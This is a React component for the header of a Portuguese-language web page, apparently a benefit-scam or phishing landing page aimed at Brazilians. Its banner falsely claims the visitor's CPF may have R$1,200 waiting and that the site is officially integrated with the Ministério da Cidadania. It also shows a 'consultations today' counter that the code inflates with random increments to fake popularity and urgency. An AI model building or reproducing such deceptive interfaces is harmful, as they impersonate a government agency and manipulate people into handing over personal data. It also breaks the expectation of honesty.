
"use client";

import type { FC } from 'react';
import { useState, useEffect } from 'react';

const UrgentHeader: FC = () => {
  const [consultations, setConsultations] = useState(12487);
  const [currentTime, setCurrentTime] = useState("");

  useEffect(() => {
    const updateCounter = () => {
      setConsultations(prev => prev + Math.floor(Math.random() * 10) + 1);
    };
    const counterInterval = setInterval(updateCounter, 5000);

    const updateTime = () => {
      setCurrentTime(new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }));
    };
    updateTime(); // Initial time
    const timeInterval = setInterval(updateTime, 60000); // Update time every minute

    return () => {
      clearInterval(counterInterval);
      clearInterval(timeInterval);
    };
  }, []);

  return (
    <div className="w-full bg-destructive text-destructive-foreground p-3 text-center shadow-md mb-6">
      <h1 className="font-headline font-bold text-lg md:text-xl leading-tight">
        🚨 ALERTA: SEU CPF PODE TER R$1.200 DISPONÍVEIS AGORA (CONFIRMAÇÃO EM 30s)
      </h1>
      <p className="text-xs mt-1 opacity-90">
        ✅ SISTEMA OFICIAL INTEGRADO AO MINISTÉRIO DA CIDADANIA | CONSULTA 100% SEGURA
      </p>
      <p className="text-xs mt-1 font-semibold">
        HOJE: {consultations.toLocaleString('pt-BR')} CONSULTAS (ATUALIZADO ÀS {currentTime})
      </p>
    </div>
  );
};

export default UrgentHeader;
